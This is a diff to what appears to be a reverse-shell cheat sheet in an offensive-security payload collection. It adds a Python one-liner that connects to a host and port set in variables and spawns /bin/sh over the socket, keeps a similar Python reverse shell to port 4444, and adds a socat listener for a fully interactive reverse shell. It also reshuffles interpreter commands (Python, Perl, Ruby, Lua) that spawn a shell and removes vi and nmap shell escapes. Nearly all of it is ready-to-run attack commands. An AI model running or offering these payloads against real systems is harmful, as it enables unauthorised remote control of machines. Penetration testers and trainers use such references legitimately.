@@ -38,6 +38,11 @@ Linux only
 
 IPv4
 ```python
+export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+IPv4
+```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
@@ -186,20 +191,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ## Spawn TTY
 
-```bash
-/bin/sh -i
-```
-
-(From an interpreter)
-
-```powershell
-python -c 'import pty; pty.spawn("/bin/sh")'
-perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
-ruby: exec "/bin/sh"
-lua: os.execute('/bin/sh')
-```
-
 Access shortcuts, su, nano and autocomplete in a partially tty shell
 /!\ OhMyZSH might break this trick, a simple `sh` is recommended
 
@@ -216,18 +207,23 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
-(From within vi)
+or use `socat` binary to get a fully tty reverse shell
 
 ```bash
-:!bash
-:set shell=/bin/bash:shell
+socat file:`tty`,raw,echo=0 tcp-listen:12345
 ```
 
-(From within nmap)
+Spawn a TTY shell from an interpreter
 
-```sh
-!sh
+```powershell
+/bin/sh -i
+python -c 'import pty; pty.spawn("/bin/sh")'
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
 ```
+
 
 ## References
 
